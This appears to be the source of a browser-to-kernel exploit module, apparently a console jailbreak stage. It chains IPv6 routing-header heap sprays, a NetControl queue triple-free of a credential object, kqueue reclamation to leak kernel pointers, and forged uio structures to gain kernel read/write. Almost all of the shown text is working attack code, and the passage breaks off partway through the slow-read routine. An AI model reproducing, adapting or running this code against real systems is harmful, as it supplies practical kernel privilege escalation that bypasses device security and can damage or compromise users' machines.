(function (root) {
    "use strict";

    const NS = root.Slopkit = root.Slopkit || {};
    const { U64, writeU32LE, writeU64LE } = NS;
    if (!U64 || !NS.NativeWorkerPool)
        throw new Error("rop.js must be loaded before kernel.js");

    const STAGE = Object.freeze({
        SAFE: "safe",
        PREPARED: "prepared",
        DIRTY: "dirty",
        TRIPLE_FREE: "triple-free",
        SLOW_RW: "slow-rw",
        FAST_RW: "fast-rw",
        STABLE: "stable"
    });

    const NEXT_STAGE = Object.freeze({
        [STAGE.SAFE]: STAGE.PREPARED,
        [STAGE.PREPARED]: STAGE.DIRTY,
        [STAGE.DIRTY]: STAGE.TRIPLE_FREE,
        [STAGE.TRIPLE_FREE]: STAGE.SLOW_RW,
        [STAGE.SLOW_RW]: STAGE.FAST_RW,
        [STAGE.FAST_RW]: STAGE.STABLE
    });

    // P2JB uses a larger search window for rebuilding routing-header aliases
    // after the slow UIO races than it does for the initial triplet search.
    const FAST_TRIPLET_ROUNDS = 5000;
    const TRIPLET_REPAIR_ATTEMPTS = 5;

    class KernelExploitError extends Error {
        constructor(message, stage, cause) {
            super(message);
            this.name = "KernelExploitError";
            this.stage = stage;
            this.cause = cause;
        }
    }

    function buildRoutingHeader(targetSize) {
        const bytes = new Uint8Array(targetSize);
        const segments = ((targetSize >>> 3) - 1) & ~1;
        bytes[0] = 0;
        bytes[1] = segments & 0xff;
        bytes[2] = 0;
        bytes[3] = (segments >>> 1) & 0xff;
        return { bytes, length: (segments + 1) << 3 };
    }

    function buildUioBytes(iovPointer, threadPointer, isRead, address, size,
        iovCount) {
        const bytes = new Uint8Array(0x40);
        writeU64LE(bytes, 0x00, iovPointer);
        writeU64LE(bytes, 0x08, iovCount);
        writeU64LE(bytes, 0x10, U64.ones());
        writeU64LE(bytes, 0x18, size);
        writeU32LE(bytes, 0x20, 1);
        writeU32LE(bytes, 0x24, isRead ? 1 : 0);
        writeU64LE(bytes, 0x28, threadPointer || 0);
        writeU64LE(bytes, 0x30, address);
        writeU64LE(bytes, 0x38, size);
        return bytes;
    }

    class PoopsKernel {
        constructor(options) {
            this.bridge = options.bridge;
            this.allocator = options.allocator;
            this.memory = options.memory;
            this.profile = options.profile;
            this.webkitBase = options.webkitBase;
            this.kernelBase = options.kernelBase;
            this.markDirty = options.markDirty || function () {};
            this.triggerFamily = options.triggerFamily || "netcontrol";
            this.onBurnProgress = options.onBurnProgress || null;
            this.markProgress = options.markProgress || function () {};
            this.stage = STAGE.SAFE;
            this.dirty = false;
            this.rebootRequired = false;
            this.preDirtyCleanupVerified = false;
            this.pool = null;
            this.buffers = {};
            this.mainOriginalAffinity = null;
            this.mainOriginalPriority = null;
            this.mainCore = null;
            this.mainAffinityApplied = false;
            this.mainPriorityApplied = false;
            this.ipv6 = [];
            this.triplets = [-1, -1, -1];
            this.twins = [-1, -1];
            this.uafSocket = -1;
            this.queueSlot = -2;
            this.kqueueFdp = U64.zero();
            this.fdtOfiles = U64.zero();
            this.fdFiles = U64.zero();
            this.master = [-1, -1];
            this.victim = [-1, -1];
            this.iovSockets = [-1, -1];
            this.uioSockets = [-1, -1];
            this.fast = false;
            this.fastValidated = false;
            this.fileHoldRecords = [];
            this.uafFile = U64.zero();
            this.freeFds = [];
            this.freeFdIdx = 0;
            this.burnWorkers = null;
            this.burnPipes = [];
            this.cleanup = {
                attempts: 0,
                workersStopped: false,
                heldPipeFds: [],
                rthdrFds: [],
                tripletRthdrFds: [],
                detachedFds: [],
                uafPurgedFds: [],
                uafDetached: 0,
                uafPurged: 0,
                phantomScan: { linearAttempts: 0, drainAttempts: 0,
                    drainTriggered: false, heldFds: [], heldPeak: 0,
                    closedFds: [], residentFds: [], targetFile: null,
                    exhausted: false },
                closedFds: [],
                schedulingRestored: false
            };
            this.c = this.profile.raw.kernel.constants;
            this.s = this.profile.raw.kernel.structures;
            this.t = this.profile.raw.kernel.tuning;
            this.attemptDiagnostics = {
                revision: "poops-netcontrol",
                triggerFamily: this.triggerFamily,
                stage: this.stage,
                reclaimComplete: false,
                twinsFound: false,
                tripletsFound: 0,
                twinRound: 0,
                reclaimCycle: 0,
                reclaimIteration: 0,
                tripletSearches: 0,
                tripletSearchRound: 0,
                tripletSearchRounds: 0,
                tripletRepairs: 0,
                tripletRepairRound: 0,
                tripletRepairRounds: 0,
                kqueueAttempt: 0,
                slowRwCalls: 0,
                slowRwRetry: 0,
                slowRwRetries: 0,
                phantomLinearAttempts: 0,
                phantomDrainAttempts: 0,
                phantomHeldPeak: 0,
                cleanupPhase: "not-started",
                failureCleanupPhase: null,
                terminalSubstage: "constructed",
                cleanup: null,
                cleanupWarnings: [],
                preDirtyCleanupVerified: false,
                failureStage: null
            };
        }

        off(path) { return this.profile.offset(path); }
        k(path) { return this.kernelBase + this.off(path); }

        transition(stage) {
            const expected = NEXT_STAGE[this.stage];
            if (expected !== stage)
                throw new Error(`invalid kernel stage transition ${this.stage} -> ${stage}`);
            this.stage = stage;
            this.attemptDiagnostics.stage = stage;
        }

        setTerminalSubstage(substage) {
            this.attemptDiagnostics.terminalSubstage = substage;
        }

        progressBoundary(tag) {
            try { this.markProgress(tag); } catch {}
        }

        diagnosticsSnapshot() {
            const source = this.attemptDiagnostics;
            return {
                revision: source.revision,
                triggerFamily: source.triggerFamily,
                stage: source.stage,
                reclaimComplete: source.reclaimComplete,
                twinsFound: source.twinsFound,
                tripletsFound: source.tripletsFound,
                twinRound: source.twinRound,
                reclaimCycle: source.reclaimCycle,
                reclaimIteration: source.reclaimIteration,
                tripletSearches: source.tripletSearches,
                tripletSearchRound: source.tripletSearchRound,
                tripletSearchRounds: source.tripletSearchRounds,
                tripletRepairs: source.tripletRepairs,
                tripletRepairRound: source.tripletRepairRound,
                tripletRepairRounds: source.tripletRepairRounds,
                kqueueAttempt: source.kqueueAttempt,
                slowRwCalls: source.slowRwCalls,
                slowRwRetry: source.slowRwRetry,
                slowRwRetries: source.slowRwRetries,
                phantomLinearAttempts: source.phantomLinearAttempts,
                phantomDrainAttempts: source.phantomDrainAttempts,
                phantomHeldPeak: source.phantomHeldPeak,
                cleanupPhase: source.cleanupPhase,
                failureCleanupPhase: source.failureCleanupPhase,
                terminalSubstage: source.terminalSubstage,
                cleanup: source.cleanup ? Object.assign({}, source.cleanup) : null,
                cleanupWarnings: Array.isArray(source.cleanupWarnings)
                    ? source.cleanupWarnings.slice() : [],
                preDirtyCleanupVerified:
                    source.preDirtyCleanupVerified === true,
                failureStage: source.failureStage
            };
        }

        call(path, args) { return this.bridge.callOffset(path, args); }
        callI32(path, args) { return this.bridge.callOffsetI32(path, args); }

        checkedZero(path, args, label) {
            const result = this.callI32(path, args);
            if (result !== 0) {
                const errno = this.lastErrno();
                throw new Error(`${label}: result=${result}`
                    + ` errno=${errno === null ? "unavailable" : errno}`);
            }
            return result;
        }

        lastErrno() {
            try {
                const pointer = this.call("native.exports.error", []);
                return this.memory.read32(pointer.toPointerNumber()) | 0;
            } catch {
                return null;
            }
        }

        maskHex(buffer) {
            return Array.from(buffer.read(0, 0x10), (value) =>
                value.toString(16).padStart(2, "0")).join("");
        }

        affinityCores(buffer) {
            const bytes = buffer.read(0, 0x10);
            const cores = [];
            for (let core = 0; core < bytes.length * 8; ++core) {
                if (bytes[core >>> 3] & (1 << (core & 7))) cores.push(core);
            }
            return cores;
        }

        alloc(size, align, label) {
            return this.allocator.alloc(size, align, label);
        }

        setupBuffers() {
            const b = this.buffers;
            const ucredSize = this.off("kernel.constants.ucredSize");
            const msgCount = this.off("kernel.constants.msgIovNum");
            const uioCount = this.off("kernel.constants.uioIovNum");
            b.spray = this.alloc(ucredSize, 0x10, "spray-rthdr");
            b.leak = this.alloc(ucredSize, 0x10, "leak-rthdr");
            b.msg = this.alloc(0x38, 0x10, "recvmsg-hdr");
            b.msgIov = this.alloc(msgCount * 0x10, 0x10, "recvmsg-iov");
            b.uioRead = this.alloc(uioCount * 0x10, 0x10, "uio-read-iov");
            b.uioWrite = this.alloc(uioCount * 0x10, 0x10, "uio-write-iov");
            b.tmp = this.alloc(0x4000, 0x10, "kernel-tmp");
            b.small = this.alloc(0x100, 0x10, "kernel-small");
            b.len = this.alloc(8, 8, "sockopt-len");
            b.sockopt = this.alloc(8, 8, "sockopt-value");
            b.pipeCommand = this.alloc(0x18, 8, "pipe-command");
            b.rw = this.alloc(0x4000, 0x10, "kernel-rw-transfer");
            b.leakResults = [];
            for (let i = 0; i < this.t.writevWorkers; ++i)
                b.leakResults.push(this.alloc(0x4000, 0x10, `slow-read-${i}`));

            const rthdr = buildRoutingHeader(ucredSize);
            b.spray.write(0, rthdr.bytes);
            this.rthdrLength = rthdr.length;
            b.msg.put64(0x10, b.msgIov.address);
            b.msg.put64(0x18, msgCount);
            b.uioRead.put64(0x00, b.tmp.address);
            b.uioWrite.put64(0x00, b.tmp.address);
            b.msgIov.put64(0x00, 1);
            b.msgIov.put64(0x08, 1);
        }

        createPipePair(label) {
            const out = this.alloc(8, 4, `${label}-fds`);
            if (this.callI32("native.exports.pipe", [out.address]) !== 0)
                throw new Error(`${label}: pipe failed`);
            const pair = [out.get32(0) | 0, out.get32(4) | 0];
            if (pair[0] < 0 || pair[1] < 0) throw new Error(`${label}: bad descriptors`);
            for (const fd of pair) {
                if (this.callI32("native.exports.fcntl",
                    [fd, this.c.fSetfl, this.c.oNonblock]) < 0)
                    throw new Error(`${label}: fcntl failed`);
            }
            return pair;
        }

        createSocketPair(label) {
            const out = this.alloc(8, 4, `${label}-fds`);
            const result = this.callI32("native.exports.socketpair",
                [this.c.afUnix, this.c.sockStream, 0, out.address]);
            if (result !== 0) throw new Error(`${label}: socketpair failed ${result}`);
            return [out.get32(0) | 0, out.get32(4) | 0];
        }

        pinMainThread() {
            if (this.mainAffinityApplied || this.mainPriorityApplied)
                throw new Error("main scheduling is already applied");
            const original = this.alloc(0x10, 0x10, "main-cpuset-original");
            const queried = this.callI32("native.exports.cpusetGetaffinity",
                [3, 1, -1, 0x10, original.address]);
            if (queried !== 0) {
                const errno = this.lastErrno();
                throw new Error(`main affinity query failed: result=${queried}`
                    + ` errno=${errno === null ? "unavailable" : errno}`);
            }
            this.mainOriginalAffinity = original;
            const originalHex = this.maskHex(original);
            const allowedCores = this.affinityCores(original);
            if (allowedCores.length === 0)
                throw new Error(`main affinity query returned an empty mask ${originalHex}`);
            const preferredCore = this.t.mainCore;
            this.mainCore = allowedCores.includes(preferredCore)
                ? preferredCore : allowedCores[0];

            const originalPriority = this.alloc(4, 4, "main-rtprio-original");
            const priorityQueried = this.callI32("native.exports.rtprioThread",
                [0, 0, originalPriority.address]);
            if (priorityQueried !== 0) {
                const errno = this.lastErrno();
                throw new Error(`main priority query failed: result=${priorityQueried}`
                    + ` errno=${errno === null ? "unavailable" : errno}`);
            }
            this.mainOriginalPriority = originalPriority;
            const originalPriorityType = originalPriority.get16(0);
            const originalPriorityValue = originalPriority.get16(2);
            if (originalPriorityType === 2
                && originalPriorityValue === this.t.realtimePriority)
                throw new Error("renderer priority is already elevated; close the web view or reboot");

            const mask = this.alloc(0x10, 0x10, "main-cpuset");
            mask.put8(this.mainCore >>> 3, 1 << (this.mainCore & 7));
            let affinity;
            this.mainAffinityApplied = true;
            try {
                affinity = this.callI32("native.exports.cpusetSetaffinity",
                    [3, 1, -1, 0x10, mask.address]);
            } catch (error) {
                const warnings = this.restoreMainThread();
                throw new Error(`main affinity core ${this.mainCore}`
                    + ` bridge failure: ${error.message}`
                    + (warnings.length ? `; restore: ${warnings.join("; ")}` : ""));
            }
            if (affinity !== 0) {
                this.mainAffinityApplied = false;
                const errno = this.lastErrno();
                throw new Error(`main affinity core ${this.mainCore} failed:`
                    + ` result=${affinity}`
                    + ` errno=${errno === null ? "unavailable" : errno}`
                    + ` original=${originalHex}`);
            }
            const rtprio = this.alloc(4, 4, "main-rtprio");
            rtprio.put16(0, 2);
            rtprio.put16(2, this.t.realtimePriority);
            let priority;
            this.mainPriorityApplied = true;
            try {
                priority = this.callI32("native.exports.rtprioThread",
                    [1, 0, rtprio.address]);
            } catch (error) {
                const warnings = this.restoreMainThread();
                throw new Error(`main realtime priority bridge failure: ${error.message}`
                    + (warnings.length ? `; restore: ${warnings.join("; ")}` : ""));
            }
            if (priority !== 0) {
                const errno = this.lastErrno();
                this.mainPriorityApplied = false;
                const warnings = this.restoreMainThread();
                throw new Error(`main realtime priority failed: result=${priority}`
                    + ` errno=${errno === null ? "unavailable" : errno}`
                    + (warnings.length ? `; restore: ${warnings.join("; ")}` : ""));
            }
        }

        restoreMainThread() {
            const warnings = [];
            if (this.mainPriorityApplied) {
                try {
                    if (!this.mainOriginalPriority)
                        throw new Error("original priority is unavailable");
                    const result = this.callI32("native.exports.rtprioThread",
                        [1, 0, this.mainOriginalPriority.address]);
                    if (result !== 0) {
                        const errno = this.lastErrno();
                        warnings.push(`main priority restore: result=${result}`
                            + ` errno=${errno === null ? "unavailable" : errno}`);
                    } else {
                        this.mainPriorityApplied = false;
                    }
                } catch (error) {
                    warnings.push(`main priority restore: ${error.message}`);
                }
            }
            if (this.mainAffinityApplied) {
                try {
                    if (!this.mainOriginalAffinity)
                        throw new Error("original affinity is unavailable");
                    const result = this.callI32("native.exports.cpusetSetaffinity",
                        [3, 1, -1, 0x10, this.mainOriginalAffinity.address]);
                    if (result !== 0) {
                        const errno = this.lastErrno();
                        warnings.push(`main affinity restore: result=${result}`
                            + ` errno=${errno === null ? "unavailable" : errno}`);
                    } else {
                        this.mainAffinityApplied = false;
                    }
                } catch (error) {
                    warnings.push(`main affinity restore: ${error.message}`);
                }
            }
            return warnings;
        }

        prepare() {
            this.setTerminalSubstage("prepare-buffers");
            this.setupBuffers();
            this.setTerminalSubstage("prepare-scheduling");
            this.pinMainThread();
            this.setTerminalSubstage("prepare-workers");
            this.uioSockets = this.createSocketPair("uio-workers");
            this.iovSockets = this.createSocketPair("recvmsg-workers");

            this.pool = new NS.NativeWorkerPool({
                bridge: this.bridge, allocator: this.allocator,
                memory: this.memory, profile: this.profile,
                webkitBase: this.webkitBase, kernelBase: this.kernelBase,
                core: this.mainCore
            });
            this.pool.start();
            this.setTerminalSubstage("prepare-pipes");
            this.master = this.createPipePair("master-pipe");
            this.victim = this.createPipePair("victim-pipe");

            this.setTerminalSubstage("prepare-ipv6");
            for (let i = 0; i < this.t.ipv6Sockets; ++i) {
                const fd = this.callI32("native.exports.socket",
                    [this.c.afInet6, this.c.sockStream, 0]);
                if (fd < 0) throw new Error(`IPv6 socket ${i} failed`);
                this.ipv6.push(fd);
            }
            for (const fd of this.ipv6) this.freeRthdr(fd);
            this.sleep(500);
            this.transition(STAGE.PREPARED);
        }

        freeRthdr(fd) {
            return this.callI32("native.exports.setsockopt",
                [fd, this.c.ipprotoIpv6, this.c.ipv6Rthdr, 0, 0]);
        }

        freeRthdrChecked(fd, label) {
            return this.checkedZero("native.exports.setsockopt",
                [fd, this.c.ipprotoIpv6, this.c.ipv6Rthdr, 0, 0],
                `${label} routing-header release`);
        }

        setRthdr(fd, buffer) {
            return this.callI32("native.exports.setsockopt",
                [fd, this.c.ipprotoIpv6, this.c.ipv6Rthdr,
                    buffer.address, this.rthdrLength]);
        }

        getRthdr(fd, length) {
            this.buffers.len.put32(0, length);
            const result = this.callI32("native.exports.getsockopt",
                [fd, this.c.ipprotoIpv6, this.c.ipv6Rthdr,
                    this.buffers.leak.address, this.buffers.len.address]);
            const actualLength = this.buffers.len.get32(0);
            return { result, length: actualLength,
                ok: result === 0 && actualLength >= length };
        }

        yield(count = 1) {
            while (count-- > 0) this.call("native.exports.schedYield", []);
        }

        sleep(milliseconds) {
            const ts = this.buffers.small.sub(0x20, 0x10, "kernel-sleep");
            ts.put64(0, Math.floor(milliseconds / 1000));
            ts.put64(8, (milliseconds % 1000) * 1000000);
            this.call("native.exports.nanosleep", [ts.address, 0]);
        }

        nativeWrite(fd, buffer, size) {
            return this.call("native.exports.write", [fd, buffer.address, size]).toInt32();
        }

        nativeRead(fd, buffer, size) {
            return this.call("native.exports.read", [fd, buffer.address, size]).toInt32();
        }

        findTwins() {
            const tag = this.off("kernel.constants.rthdrTag") >>> 0;
            const diagnostics = this.attemptDiagnostics;
            diagnostics.twinRound = 0;
            for (let round = 0; round < this.t.twinRounds; ++round) {
                diagnostics.twinRound = round + 1;
                for (let i = 0; i < this.ipv6.length; ++i) {
                    this.buffers.spray.put32(4, tag | i);
                    this.setRthdr(this.ipv6[i], this.buffers.spray);
                }
                for (let i = 0; i < this.ipv6.length; ++i) {
                    if (!this.getRthdr(this.ipv6[i], 8).ok) continue;
                    const value = this.buffers.leak.get32(4);
                    const j = value & 0xffff;
                    if ((value & 0xffff0000) === (tag & 0xffff0000)
                        && i !== j && j < this.ipv6.length) {
                        this.twins = [i, j];
                        return this.twins;
                    }
                }
                if ((round % 50) === 0) this.yield();
            }
            throw new Error(`no routing-header twins after ${this.t.twinRounds} rounds`);
        }

        findTriplet(master, excluded, maxRounds) {
            const rounds = maxRounds ?? this.t.tripletRounds;
            const tag = this.off("kernel.constants.rthdrTag") >>> 0;
            const diagnostics = this.attemptDiagnostics;
            diagnostics.tripletSearches++;
            diagnostics.tripletSearchRound = 0;
            for (let round = 0; round < rounds; ++round) {
                diagnostics.tripletSearchRound = round + 1;
                diagnostics.tripletSearchRounds++;
                for (let i = 0; i < this.ipv6.length; ++i) {
                    if (i === master || i === excluded) continue;
                    this.buffers.spray.put32(4, tag | i);
                    this.setRthdr(this.ipv6[i], this.buffers.spray);
                }
                if (!this.getRthdr(this.ipv6[master], 8).ok) continue;
                const value = this.buffers.leak.get32(4);
                const j = value & 0xffff;
                if ((value & 0xffff0000) === (tag & 0xffff0000)
                    && j !== master && j !== excluded && j < this.ipv6.length) {
                    return j;
                }
                if ((round % 100) === 0) this.yield();
            }
            return -1;
        }

        validTripletIndex(index) {
            return Number.isSafeInteger(index) && index >= 0
                && index < this.ipv6.length;
        }

        repairTriplet(slot, excluded, maxAttempts) {
            const attempts = maxAttempts ?? TRIPLET_REPAIR_ATTEMPTS;
            const diagnostics = this.attemptDiagnostics;
            diagnostics.tripletRepairs++;
            diagnostics.tripletRepairRound = 0;
            for (let attempt = 0; attempt < attempts; ++attempt) {
                diagnostics.tripletRepairRound = attempt + 1;
                diagnostics.tripletRepairRounds++;
                const result = this.findTriplet(this.triplets[0], excluded,
                    FAST_TRIPLET_ROUNDS);
                if (result >= 0) {
                    this.triplets[slot] = result;
                    return true;
                }
                this.yield();
            }
            this.triplets[slot] = -1;
            return false;
        }

        repairTriplets(maxAttempts) {
            if (!this.validTripletIndex(this.triplets[0])) return false;
            if (!this.validTripletIndex(this.triplets[1])) {
                const excluded = this.validTripletIndex(this.triplets[2])
                    ? this.triplets[2] : -1;
                if (!this.repairTriplet(1, excluded, maxAttempts)) return false;
            }
            if (!this.validTripletIndex(this.triplets[2])
                && !this.repairTriplet(2, this.triplets[1], maxAttempts)) return false;
            return true;
        }

        readWritevCommand(state, size) {
            if (!state || state.complete || state.readComplete) return state;
            if (state.leadLength === null)
                state.leadLength = this.nativeRead(
                    this.uioSockets[0], this.buffers.tmp, size);
            while (state.resultLengths.length < this.buffers.leakResults.length) {
                const output = this.buffers.leakResults[state.resultLengths.length];
                state.resultLengths.push(this.nativeRead(
                    this.uioSockets[0], output, size));
            }
            state.readComplete = true;
            return state;
        }

        waitWritevCommand(state) {
            if (!state || state.complete) return state;
            this.pool.writev.wait();
            state.complete = true;
            return state;
        }

        drainWritevCommand(state, size) {
            this.readWritevCommand(state, size);
            return this.waitWritevCommand(state);
        }

        feedReadvCommand(state, input, size) {
            if (!state || state.complete) return state;
            while (state.writes < this.t.readvWorkers) {
                state.results.push(this.nativeWrite(
                    this.uioSockets[1], input, size));
                state.writes++;
            }
            return state;
        }

        waitReadvCommand(state) {
            if (!state || state.complete) return state;
            this.pool.readv.wait();
            state.complete = true;
            return state;
        }

        releaseRecvCommand(state) {
            if (!state || state.complete) return state;
            if (!state.released) {
                this.unblockRecvWorkers();
                state.released = true;
            }
            if (!state.waited) {
                this.pool.recv.wait();
                state.waited = true;
            }
            return state;
        }

        drainRecvCommand(state) {
            if (!state || state.complete) return state;
            this.releaseRecvCommand(state);
            this.drainRecvWorkers();
            state.complete = true;
            return state;
        }

        unwindSlowRw(state) {
            const attempt = (operation) => {
                try { operation(); }
                catch {}
            };
            if (state.writev && !state.writev.complete)
                attempt(() => this.drainWritevCommand(state.writev, state.size));
            if (state.readv && !state.readv.complete) {
                attempt(() => this.feedReadvCommand(
                    state.readv, state.input, state.size));
                attempt(() => this.waitReadvCommand(state.readv));
            }
            const repair = () => {
                if (!this.repairTriplets(1))
                    throw new Error("slow R/W triplet unwind incomplete");
            };
            attempt(repair);
            if (state.recv && !state.recv.complete)
                attempt(() => this.releaseRecvCommand(state.recv));
            attempt(repair);
            if (state.recv && !state.recv.complete)
                attempt(() => this.drainRecvCommand(state.recv));
        }

        unblockRecvWorkers() {
            const expected = this.t.workerUnblockBytes;
            const result = this.nativeWrite(this.iovSockets[1], this.buffers.tmp,
                expected);
            if (result !== expected)
                throw new Error(`recv worker unblock returned ${result}/${expected}`);
        }

        drainRecvWorkers() {
            const expected = this.t.workerUnblockBytes;
            const result = this.nativeRead(this.iovSockets[0], this.buffers.tmp,
                expected);
            if (result !== expected)
                throw new Error(`recv worker drain returned ${result}/${expected}`);
        }

        claimNetcontrolQueue(dummy, setBuffer) {
            setBuffer.put32(0, dummy);
            // Persistence must succeed before either queue slot can be touched.
            this.markDirty("netcontrol-set-queue");
            this.dirty = true;
            this.rebootRequired = true;
            this.transition(STAGE.DIRTY);

            const attempts = [];
            let result = this.callI32("native.exports.netcontrol",
                [-1, this.off("kernel.constants.netcontrolSetQueue"),
                    setBuffer.address, 8]);
            attempts.push({ slot: 0, result });
            if (result === 0) {
                this.queueSlot = 0;
            } else {
                result = this.callI32("native.exports.netcontrol",
                    [1, this.off("kernel.constants.netcontrolSetQueue"),
                        setBuffer.address, 8]);
                attempts.push({ slot: 1, result });
                if (result === 0) this.queueSlot = 1;
            }
            if (this.queueSlot < 0)
                throw new Error("all NetControl queue slots are occupied"
                    + ` (${attempts.map((entry) =>
                        `${entry.slot}:${entry.result}`).join(",")})`);
            return this.queueSlot;
        }

        clearNetcontrolQueue(uafSocket, clearBuffer) {
            if (this.queueSlot !== 0 && this.queueSlot !== 1)
                throw new Error("NetControl queue slot was not selected");
            clearBuffer.put32(0, uafSocket);
            const result = this.callI32("native.exports.netcontrol",
                [this.queueSlot, this.off("kernel.constants.netcontrolClearQueue"),
                    clearBuffer.address, 8]);
            if (result !== 0)
                throw new Error(`NetControl CLEAR_QUEUE slot ${this.queueSlot}`
                    + ` failed ${result}`);
            return result;
        }

        triggerTripleFree() {
            if (this.triggerFamily !== "netcontrol")
                throw new Error(`unsupported base trigger family ${this.triggerFamily}`);
            return this.triggerNetcontrol();
        }

        triggerNetcontrol() {
            this.setTerminalSubstage("netcontrol-release-headers");
            for (const fd of this.ipv6)
                this.freeRthdrChecked(fd, `IPv6 fd ${fd}`);
            const setBuffer = this.buffers.small.sub(0, 8, "netcontrol-set");
            const clearBuffer = this.buffers.small.sub(8, 8, "netcontrol-clear");
            const dummy = this.callI32("native.exports.socket",
                [this.c.afUnix, this.c.sockStream, 0]);
            if (dummy < 0) throw new Error("discard socket failed");
            this.setTerminalSubstage("netcontrol-claim-queue");
            this.claimNetcontrolQueue(dummy, setBuffer);

            this.setTerminalSubstage("netcontrol-arm-uaf");
            this.checkedZero("native.exports.close", [dummy],
                `discard socket close(${dummy})`);
            this.checkedZero("native.exports.setuid", [1],
                "first NetControl setuid(1)");
            this.uafSocket = this.callI32("native.exports.socket",
                [this.c.afUnix, this.c.sockStream, 0]);
            if (this.uafSocket < 0) throw new Error("UAF socket allocation failed");
            this.checkedZero("native.exports.setuid", [1],
                "second NetControl setuid(1)");
            this.clearNetcontrolQueue(this.uafSocket, clearBuffer);

            this.setTerminalSubstage("reclaim-prime");
            for (let i = 0; i < this.t.reclaimCycles; ++i) {
                this.attemptDiagnostics.reclaimCycle = i + 1;
                this.pool.recv.dispatch([this.iovSockets[0],
                    this.buffers.msg.address, 0], false);
                this.yield();
                this.unblockRecvWorkers();
                this.pool.recv.wait();
                this.drainRecvWorkers();
            }

            const duplicate = this.callI32("native.exports.dup", [this.uafSocket]);
            if (duplicate < 0) throw new Error("UAF dup failed");
            this.checkedZero("native.exports.close", [duplicate],
                `UAF duplicate close(${duplicate})`);
            this.setTerminalSubstage("twin-search");
            this.findTwins();
            this.attemptDiagnostics.twinsFound = true;
            this.freeRthdrChecked(this.ipv6[this.twins[1]],
                `twin fd ${this.ipv6[this.twins[1]]}`);
            this.yield();
            this.yield();
            this.sleep(1);

            let reclaimed = false;
            this.setTerminalSubstage("ucred-reclaim");
            for (let i = 0; i < this.t.maxInnerIterations; ++i) {
                this.attemptDiagnostics.reclaimIteration = i + 1;
                this.pool.recv.dispatch([this.iovSockets[0],
                    this.buffers.msg.address, 0], false);
                this.yield();
                this.buffers.leak.put32(0, 0);
                this.buffers.leak.put32(4, 0);
                const observation = this.getRthdr(this.ipv6[this.twins[0]], 8);
                if (observation.ok && this.buffers.leak.get32(0) === 1) {
                    reclaimed = true;
                    break;
                }
                this.unblockRecvWorkers();
                this.pool.recv.wait();
                this.drainRecvWorkers();
            }
            if (!reclaimed) throw new Error("recvmsg did not reclaim the shared ucred");
            this.attemptDiagnostics.reclaimComplete = true;

            this.triplets[0] = this.twins[0];
            const duplicate2 = this.callI32("native.exports.dup", [this.uafSocket]);
            if (duplicate2 < 0) {
                this.unblockRecvWorkers();
                this.pool.recv.wait();
                this.drainRecvWorkers();
                throw new Error("triple-free dup failed");
            }
            const closeDuplicate2 = this.callI32("native.exports.close",
                [duplicate2]);
            if (closeDuplicate2 !== 0) {
                const errno = this.lastErrno();
                this.unblockRecvWorkers();
                this.pool.recv.wait();
                this.drainRecvWorkers();
                throw new Error(`triple-free duplicate close(${duplicate2}):`
                    + ` result=${closeDuplicate2}`
                    + ` errno=${errno === null ? "unavailable" : errno}`);
            }
            this.yield();
            this.setTerminalSubstage("triplet-second-search");
            this.triplets[1] = this.findTriplet(this.triplets[0], -1);
            this.unblockRecvWorkers();
            if (this.triplets[1] < 0) {
                this.pool.recv.wait();
                this.drainRecvWorkers();
                throw new Error("second routing-header alias missing");
            }
            this.yield();
            this.setTerminalSubstage("triplet-third-search");
            this.triplets[2] = this.findTriplet(this.triplets[0], this.triplets[1]);
            this.pool.recv.wait();
            this.drainRecvWorkers();
            if (this.triplets[2] < 0) throw new Error("third routing-header alias missing");
            this.attemptDiagnostics.tripletsFound = 3;
            this.transition(STAGE.TRIPLE_FREE);
        }

        crfreeOverflow(label) {
            if (this.freeFdIdx >= this.freeFds.length)
                throw new Error(`crfree: free-fd pool exhausted (${this.freeFdIdx}/${this.freeFds.length})`);
            const fd = this.freeFds[this.freeFdIdx++];
            const result = this.callI32("native.exports.close", [fd]);
            if (result !== 0) {
                const errno = this.lastErrno();
                throw new Error(`P2JB ${label} credential drop close(${fd}):`
                    + ` result=${result}`
                    + ` errno=${errno === null ? "unavailable" : errno}`);
            }
        }

        reclaimKqueue() {
            this.setTerminalSubstage("kqueue-reclaim");
            this.freeRthdr(this.ipv6[this.triplets[1]]);
            let kq = -1;
            let found = false;
            for (let i = 0; i < this.t.kqueueRounds; ++i) {
                this.attemptDiagnostics.kqueueAttempt = i + 1;
                kq = this.callI32("native.exports.kqueue", []);
                if (kq < 0) throw new Error("kqueue allocation failed");
                const observation = this.getRthdr(
                    this.ipv6[this.triplets[0]], 0x100);
                if (observation.ok && this.buffers.leak.get64(8).eq(0x1430000)
                    && !this.buffers.leak.get64(this.off("kernel.structures.kqueueFdp")).isZero()) {
                    found = true;
                    break;
                }
                this.callI32("native.exports.close", [kq]);
                kq = -1;
                this.yield();
            }
            if (!found) throw new Error("kqueue reclaim did not expose fdp");
            this.kqueueFdp = this.buffers.leak.get64(
                this.off("kernel.structures.kqueueFdp"));
            if (!this.kqueueFdp.isKernelPointer())
                throw new Error(`invalid kqueue fdp ${this.kqueueFdp}`);
            this.callI32("native.exports.close", [kq]);
            this.setTerminalSubstage("kqueue-triplet-search");
            this.triplets[1] = this.findTriplet(this.triplets[0], this.triplets[2]);
            if (this.triplets[1] < 0) throw new Error("failed to rebuild kqueue triplet");
        }

        setSendBuffer(size) {
            this.buffers.sockopt.put32(0, size);
            const result = this.callI32("native.exports.setsockopt",
                [this.uioSockets[1], this.off("kernel.constants.solSocket"),
                    this.off("kernel.constants.soSndbuf"),
                    this.buffers.sockopt.address, 4]);
            if (result !== 0) throw new Error(`SO_SNDBUF failed ${result}`);
        }

        buildUio(destination, iovPointer, isRead, address, size) {
            const bytes = buildUioBytes(iovPointer, 0, isRead, address, size,
                this.off("kernel.constants.uioIovNum"));
            destination.write(0, bytes);
        }

        slowRead(address, size) {
            if (size <= 0 || size > 0x4000) throw new RangeError("invalid slow read size");
            const diagnostics = this.attemptDiagnostics;
            diagnostics.slowRwCalls++;
            diagnostics.slowRwRetry = 0;
            const state = { size, input: null, writev: null, readv: null,
                recv: null };
            try {
                this.setSendBuffer(size);
                this.buffers.tmp.fill(0x41);
                const seeded = this.nativeWrite(
                    this.uioSockets[1], this.buffers.tmp, size);
                if (seeded !== size)
                    throw new Error(`slow read seed returned ${seeded}/${size}`);
                this.buffers.uioRead.put64(8, size);
                this.freeRthdr(this.ipv6[this.triplets[1]]);
                this.yield(3);
                this.triplets[1] = -1;

                let uioCaptured = false;
                this.setTerminalSubstage("slow-read-uio-capture");
                for (let i = 0; i < this.t.maxInnerIterations; ++i) {
                    diagnostics.slowRwRetry = i + 1;
